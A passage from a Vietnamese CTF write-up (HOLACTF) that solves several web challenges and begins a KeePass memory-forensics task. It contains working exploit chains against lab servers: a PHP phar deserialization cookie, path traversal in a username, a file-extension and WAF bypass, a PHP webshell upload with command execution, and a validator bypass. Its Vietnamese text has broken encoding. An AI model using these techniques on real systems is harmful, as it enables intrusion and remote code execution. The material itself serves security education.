<h4 id="Tao-cookie"><a href="#Tao-cookie" class="headerlink" title="T·∫°o cookie"></a>T·∫°o cookie</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$phar</span> = <span class="string">&#x27;phar://upload/testq/avatar.gif/a&#x27;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$len</span> = [Text.Encoding]::UTF8.GetByteCount(<span class="variable">$phar</span>)</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$ser</span> = <span class="string">&#x27;O:7:&quot;LogFile&quot;:1:&#123;s:8:&quot;filename&quot;;s:&#x27;</span> + <span class="variable">$len</span> + <span class="string">&#x27;:&quot;&#x27;</span> + <span class="variable">$phar</span> + <span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$cookie</span> = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(<span class="variable">$ser</span>))</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; &amp; <span class="string">&quot;<span class="variable">$env</span>:SystemRoot\System32\curl.exe&quot;</span> -s `</span><br><span class="line">&gt;&gt;   -H <span class="string">&quot;Cookie: user=<span class="variable">$cookie</span>&quot;</span> `</span><br><span class="line">&gt;&gt;   <span class="string">&quot;http://127.0.0.1:59925/?page=view_avatars&quot;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; Invoke-WebRequest -UseBasicParsing `</span><br><span class="line">&gt;&gt;   -Uri <span class="string">&quot;http://127.0.0.1:59925/?page=view_avatars&quot;</span> `</span><br><span class="line">&gt;&gt;   -Headers @&#123; Cookie = <span class="string">&quot;user=<span class="variable">$cookie</span>&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">StatusCode        : 200</span><br><span class="line">StatusDescription : OK</span><br><span class="line">Content           :</span><br><span class="line"></span><br><span class="line">                    &lt;!DOCTYPE html&gt;</span><br><span class="line">                    &lt;html lang=<span class="string">&quot;en&quot;</span> <span class="built_in">dir</span>=<span class="string">&quot;ltr&quot;</span>&gt;</span><br><span class="line">                    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">                        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">                        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">                        &lt;title&gt; Login &lt;/title&gt;</span><br><span class="line">                        &lt;style&gt;...</span><br><span class="line">RawContent        : HTTP/1.1 200 OK</span><br><span class="line">                    Transfer-Encoding: chunked</span><br><span class="line">                    Connection: keep-alive</span><br><span class="line">                    Content-Type: text/html; charset=UTF-8</span><br><span class="line">                    Date: Sat, 30 Aug 2025 05:55:40 GMT</span><br><span class="line">                    Server: nginx</span><br><span class="line">                    X-Powered-By: PHP/7.4.0</span><br><span class="line"></span><br><span class="line">                    &lt;!DOCTYP...</span><br><span class="line">Forms             :</span><br><span class="line">Headers           : &#123;[Transfer-Encoding, chunked], [Connection, keep-alive], [Content-Type, text/html; charset=UTF-8], [Date, Sat,</span><br><span class="line">                    30 Aug 2025 05:55:40 GMT]...&#125;</span><br><span class="line">Images            : &#123;&#125;</span><br><span class="line">InputFields       : &#123;&#125;</span><br><span class="line">Links             : &#123;@&#123;outerHTML=&lt;a href=<span class="string">&quot;/?page=register&quot;</span>&gt;Register now&lt;/a&gt;; tagName=A; href=/?page=register&#125;&#125;</span><br><span class="line">ParsedHtml        :</span><br><span class="line">RawContentLength  : 3513</span><br></pre></td></tr></table></figure>

<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Desktop&gt; &amp; <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\System32\curl.exe&quot;</span> <span class="literal">-s</span> <span class="string">&quot;http://127.0.0.1:59925/logMD5.php&quot;</span></span><br><span class="line"><span class="number">01865</span>ef3919e542a1a0fdc04313a5433</span><br><span class="line">d304cc0f95860c2799b0a4e91b467f68</span><br><span class="line"><span class="number">0764</span>f8c8d680bb675f87e3f1a892a4b8</span><br><span class="line">eccfb18a53ac83c6a4560d3fb7a21c30</span><br><span class="line">eccde4803614947511bd1af76d1930e6</span><br><span class="line"><span class="number">63</span>a4ecf57394c8e85ecc817941453343</span><br><span class="line">HOLACTF&#123;I_love_EHCCCCC_cdfdcc941c4f&#125;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Desktop&gt;</span><br></pre></td></tr></table></figure>

<p><code>FLAG: HOLACTF&#123;I_love_EHCCCCC_cdfdcc941c4f&#125;</code></p>
<h3 id="WEB-another-hell-ehc"><a href="#WEB-another-hell-ehc" class="headerlink" title="WEB - another_hell_ehc"></a>WEB - another_hell_ehc</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Author</span><br><span class="line">perrito</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">I just create a new challenge with the same source code because i&#x27;m too lazy :((</span><br></pre></td></tr></table></figure>

<h4 id="Username-co-the-traversal-de-ghi-ra-docroot"><a href="#Username-co-the-traversal-de-ghi-ra-docroot" class="headerlink" title="Username c√≥ th·ªÉ traversal ƒë·ªÉ ghi ra docroot"></a>Username c√≥ th·ªÉ traversal ƒë·ªÉ ghi ra docroot</h4><p><code>login.php</code> ƒë·∫∑t <code>$_SESSION[&quot;username&quot;]</code> t·ª´ input, ch·ªâ strip tags. Kh√¥ng ch·∫∑n <code>../</code>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// login.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$username</span>));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>upload.php</code> d√πng tr·ª±c ti·∫øp <code>$_SESSION[&#39;username&#39;]</code> ƒë·ªÉ t·∫°o th∆∞ m·ª•c l∆∞u file.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;/&quot;</span>;   <span class="comment">// &lt;-- traversal t·∫°i ƒë√¢y</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$target_dir</span>)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">mkdir</span>(<span class="variable">$target_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‚Üí ƒê·∫∑t username &#x3D; <code>../../../../../var/www/html</code> s·∫Ω khi·∫øn file ƒë∆∞·ª£c ghi v√†o <code>/var/www/html/‚Ä¶</code>.</p>
<h4 id="Sai-logic-lay-duoi-file-co-the-dung-jpg-phtml"><a href="#Sai-logic-lay-duoi-file-co-the-dung-jpg-phtml" class="headerlink" title="Sai logic l·∫•y ƒëu√¥i file c√≥ th·ªÉ d√πng .jpg.phtml"></a>Sai logic l·∫•y ƒëu√¥i file c√≥ th·ªÉ d√πng <code>.jpg.phtml</code></h4><p><code>upload.php</code> l·∫•y ƒëu√¥i b·∫±ng ph·∫ßn t·ª≠ <strong>th·ª© hai</strong> sau <code>.</code> thay v√¨ ph·∫ßn t·ª≠ cu·ªëi.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line">...</span><br><span class="line"><span class="variable">$fileExt</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$fileName</span>))[<span class="number">1</span>]; <span class="comment">//ch·ªâ l·∫•y sau d·∫•u ch·∫•m ƒë·∫ßu ti√™n</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileExt</span>, <span class="variable">$allowedExtensions</span>)) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;Sorry, your file type is not allowed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‚Üí T√™n <code>rce.jpg.phtml</code> cho <code>fileExt = &#39;jpg&#39;</code> n√™n qua allowlist. File th·ª±c t·∫ø l√† PHP v√¨ ƒëu√¥i cu·ªëi <code>.phtml</code> v·∫´n ƒë∆∞·ª£c Apache parse.</p>
<h4 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h4><p><code>nginx.conf</code> ch·ªâ g·ªçi WAF khi chu·ªói query ch·ª©a ƒë√∫ng <code>page=upload</code>. WAF ch·ªâ g·∫Øn v√†o <code>page=upload</code> c√≥ th·∫ø bypass d√πng <code>%75</code> :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># nginx.conf</span><br><span class="line">location / &#123;</span><br><span class="line">    if ($args ~ &quot;page=upload&quot;) &#123;</span><br><span class="line">        access_by_lua_file /usr/local/openresty/nginx/lua/waf.lua;</span><br><span class="line">    &#125;</span><br><span class="line">    proxy_pass http://127.0.0.1:8080/;</span><br><span class="line">&#125;</span><br><span class="line">location /upload &#123; deny all; return 403; &#125;</span><br></pre></td></tr></table></figure>

<p>‚Üí G·ªçi <code>/?page=%75pload</code> th√¨ PHP decode th√†nh <code>upload</code> nh∆∞ng Nginx kh√¥ng kh·ªõp regex n√™n WAF s·∫Ω kh√¥ng ho·∫°t ƒë·ªông.</p>
<h4 id="WAF-co-allowlist-duoi-anh-block-php-phtml"><a href="#WAF-co-allowlist-duoi-anh-block-php-phtml" class="headerlink" title="WAF c√≥ allowlist ƒëu√¥i ·∫£nh, block .php|.phtml"></a>WAF c√≥ allowlist ƒëu√¥i ·∫£nh, block <code>.php|.phtml</code></h4><p>(b·ªã v√¥ hi·ªáu do bypass ·ªü b∆∞·ªõc v·ª´a r·ªìi)</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- waf.lua</span></span><br><span class="line"><span class="keyword">local</span> filename = body:<span class="built_in">match</span>(<span class="string">&#x27;filename=&quot;([^&quot;]+)&quot;&#x27;</span>)</span><br><span class="line"><span class="keyword">local</span> ext = filename:<span class="built_in">match</span>(<span class="string">&quot;%.([^.]+)$&quot;</span>)  <span class="comment">-- l·∫•y ƒëu√¥i CU·ªêI</span></span><br><span class="line"><span class="keyword">local</span> allowed = &#123; jpg=<span class="literal">true</span>, jpeg=<span class="literal">true</span>, png=<span class="literal">true</span>, gif=<span class="literal">true</span> &#125;</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> allowed[ext:<span class="built_in">lower</span>()] <span class="keyword">then</span></span><br><span class="line">    ngx.<span class="built_in">status</span> = <span class="number">403</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Blocked: file extension not allowed - &quot;</span> .. ext)</span><br><span class="line">    <span class="keyword">return</span> ngx.<span class="built_in">exit</span>(<span class="number">403</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="Router-include-theo-page"><a href="#Router-include-theo-page" class="headerlink" title="Router include theo page"></a>Router include theo <code>page</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="variable">$regex</span>=<span class="string">&quot;/(secret|proc|environ|access|error|\.\.|\/|,|;|[|]|\|connect)/i&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$regex</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// (ƒëo·∫°n th√™m .php r·ªìi include)</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$page</span>)) &#123; <span class="keyword">include</span>(<span class="variable">$page</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?page=home.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>G·ªçi tr·ª±c ti·∫øp <code>/rce.jpg.phtml</code> v√¨ file ƒë√£ ƒë∆∞·ª£c ghi th·∫≥ng v√†o docroot do tr∆∞·ªõc ƒë·∫•y d√πng path traversal.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\biscuit\Desktop&gt;</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$BASE</span> = <span class="string">&#x27;http://127.0.0.1:63936&#x27;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$U</span>    = <span class="string">&#x27;../../../../../var/www/html&#x27;</span>   <span class="comment"># traversal t·ªõi /var/www/html</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="variable">$P</span>    = <span class="string">&#x27;p@ssw0rd&#x27;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; curl.exe -s -c c.txt -X POST <span class="string">&quot;<span class="variable">$BASE</span>/?page=register&quot;</span> --data-urlencode <span class="string">&quot;username=<span class="variable">$U</span>&quot;</span> --data-urlencode <span class="string">&quot;password=<span class="variable">$P</span>&quot;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; curl.exe -s -b c.txt -c c.txt -X POST <span class="string">&quot;<span class="variable">$BASE</span>/?page=login&quot;</span>    --data-urlencode <span class="string">&quot;username=<span class="variable">$U</span>&quot;</span> --data-urlencode <span class="string">&quot;password=<span class="variable">$P</span>&quot;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="comment"># t·∫°o webshell</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; Set-Content -Path .\s.php -Value <span class="string">&#x27;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#x27;</span> -Encoding ASCII -NoNewline</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="comment"># upload qua ƒë∆∞·ªùng t·∫Øt WAF: page=%75pload</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="comment"># l·∫•y ƒëu√¥i = &#x27;jpg&#x27;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; curl.exe -s -b c.txt -F <span class="string">&quot;avatar=@s.php;type=image/jpeg;filename=rce.jpg.phtml&quot;</span> <span class="string">&quot;<span class="variable">$BASE</span>/?page=%75pload&quot;</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; <span class="comment"># RCE v√† ƒë·ªçc flag</span></span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; curl.exe -G -s --data-urlencode <span class="string">&quot;c=whoami&quot;</span>         <span class="string">&quot;<span class="variable">$BASE</span>/rce.jpg.phtml&quot;</span></span><br><span class="line">www-data</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt; curl.exe -G -s --data-urlencode <span class="string">&quot;c=cat /flag.txt&quot;</span>  <span class="string">&quot;<span class="variable">$BASE</span>/rce.jpg.phtml&quot;</span></span><br><span class="line">HOLACTF&#123;I_really_love_EHCCCCC_b3c78f2d5c35&#125;</span><br><span class="line">PS C:\Users\biscuit\Desktop&gt;</span><br></pre></td></tr></table></figure>

<p><code>FLAG: HOLACTF&#123;I_really_love_EHCCCCC_b3c78f2d5c35&#125;</code></p>
<h3 id="WEB-Sanity-check"><a href="#WEB-Sanity-check" class="headerlink" title="WEB- Sanity check"></a>WEB- Sanity check</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Author</span><br><span class="line">ductohno</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">Ch√†o m·ª´ng b·∫°n gh√© thƒÉm website ‚Äúvibe coding‚Äù c·ªßa m√¨nh! Th·ª±c ra m√¨nh d·ª±ng n√≥ ch·ªâ ƒë·ªÉ test xem server c·∫ßn oxi kh√¥ng th√¥i, nh∆∞ng ·ªü ƒë√¢u ƒë√≥ v·∫´n c√≥ v√†i l·ªói nho nh·ªè ƒëang ·∫©n m√¨nh. Li·ªáu b·∫°n c√≥ t√¨m ra ch√∫ng kh√¥ng?</span><br></pre></td></tr></table></figure>

<p>M√¨nh th·∫•y ·ªü <code>/update</code> duy·ªát s·∫Ω check valid input nh∆∞ sau: duy·ªát <code>for char in data[&#39;data&#39;]</code> r·ªìi √©p <code>int(char)</code> ‚àà {0,1}. N·∫øu <code>data[&#39;data&#39;]</code> l√† dict th√¨ v√≤ng l·∫∑p ƒëi qua <strong>key</strong>. N√™n m√¨nh s·∫Ω t·∫°o ƒë√∫ng 512 key sao cho <code>int(key)</code> lu√¥n l√† 0 ho·∫∑c 1, r·ªìi g·∫Øn m·ªôt value ch·ª©a <code>&quot;Holactf&quot;</code>. Server l∆∞u <code>str(dict)</code> v√†o file n√™n chu·ªói <code>&quot;Holactf&quot;</code> xu·∫•t hi·ªán. <code>/get_flag</code> ch·ªâ c·∫ßn <code>&quot;Holactf&quot; in data</code> n√™n tr·∫£ flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_input</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Check if input is valid or not&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">input</span>) != NUMBER_OF_BITS:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(char) != <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">int</span>(char) != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_User_Exist</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> is_valid_input(data[<span class="string">&#x27;data&#x27;</span>])):</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>:<span class="string">&#x27;Invalid input&#x27;</span>&#125;)</span><br><span class="line">        save_to_file(data[<span class="string">&#x27;data&#x27;</span>], get_user_filename())</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;updated&#x27;</span>, <span class="string">&#x27;new_state&#x27;</span>: data[<span class="string">&#x27;data&#x27;</span>]&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>:e&#125;)</span><br></pre></td></tr></table></figure>

<p>Script t·∫°o <code>data</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">HALF = BITS // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zeros_block</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="string">&#x27;0&#x27;</span>*(i+<span class="number">1</span>): <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ones_block</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123; (<span class="string">&#x27;0&#x27;</span>*i)+<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>():</span><br><span class="line">    m = zeros_block(HALF)</span><br><span class="line">    m.update(ones_block(HALF))</span><br><span class="line">    m[<span class="string">&#x27;0&#x27;</span>] = <span class="string">&#x27;Holactf&#x27;</span>          <span class="comment"># trigger</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;data&quot;</span>: m&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(json.dumps(build()))</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/B1Tdf8-qgx.png" alt="image"></p>
<p>sau ƒë√≥ m√¨nh Intercept request ƒë·ªÉ ƒë·ªïi <code>data</code> m√¨nh v·ª´a gen ra:</p>
<p><img src="https://hackmd.io/_uploads/rkwKzLZceg.png" alt="image 1"></p>
<p>V√† access t·ªõi <code>/get_flag</code> ƒë·ªÉ ƒë·ªçc flag:</p>
<p><img src="https://hackmd.io/_uploads/SJGsG8b5ge.png" alt="image 2"></p>
<p><code>FLAG: HOLACTF&#123;a_C0NciDeNT_h4pP3n_3dd3c5938c2b&#125;</code></p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="First-step-into-forensics"><a href="#First-step-into-forensics" class="headerlink" title="First step into forensics"></a>First step into forensics</h3><p>·ªû b√†i n√†y m√¨nh ƒë∆∞·ª£c cung c·∫•p 3 file, 1 file minidump Keepass, 1 file Keepass database, v√† 1 file zip c√≥ m·∫≠t kh·∫©u. V·ªõi context ƒë∆∞·ª£c cung c·∫•p l√† <code>strings + grep</code>, m√¨nh ƒëo√°n ngay ƒë∆∞·ª£c flow c·ªßa b√†i n√†y l√† <code>strings + grep</code> l·∫•y pass cho file <code>infected.kdbx</code>, m·ªü file ƒë√≥ l·∫•y pass cho file zip, r·ªìi l·∫°i <code>strings + grep</code> l·∫•y flag trong file minidump cu·ªëi. V√† ƒë√≥ l√† c√°ch 1, c√°ch 2 th√¨ c√°c b·∫°n k c·∫ßn ph·∫£i <code>strings + grep</code>.</p>
<p>Load <code>infected.dmp</code> v√†o <strong>Windbg</strong>. T·∫≠n d·ª•ng class <code>KeePassLib.Security.ProtectedString</code>, m·ªôt class ch·ªãu tr√°ch nhi·ªám l∆∞u tr·ªØ m·∫≠t kh·∫©u ng∆∞·ªùi d√πng d∆∞·ªõi d·∫°ng b·∫£o v·ªá (protected) trong KeePass.<br>D√πng <code>!dumpheap -type KeePassLib.Security.ProtectedString</code> ƒë·ªÉ l·∫•y ƒë·ªãa ch·ªâ c·ªßa c√°c object thu·ªôc class trong memory.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!DumpHeap /d -mt 00007ffa49031b90</span><br><span class="line">         Address               MT     Size</span><br><span class="line">0000000002dd90e0 00007ffa49031b90       40</span><br><span class="line">0000000002dd9108 00007ffa49031b90       40</span><br><span class="line">0000000002f7e500 00007ffa49031b90       40</span><br><span class="line"></span><br><span class="line">Statistics:</span><br><span class="line">              MT    Count    TotalSize Class Name</span><br><span class="line">00007ffa49031b90        3          120 KeePassLib.Security.ProtectedString</span><br></pre></td></tr></table></figure>

<p>Sau ƒë√≥, d√πng <code>!DumpObj /d &lt;address&gt;</code> ƒë·ªÉ dump object t·∫°i ƒë·ªãa ch·ªâ ƒë√≥ ra bao g·ªìm class name v√† c√°c variables c·ªßa ch√∫ng.</p>
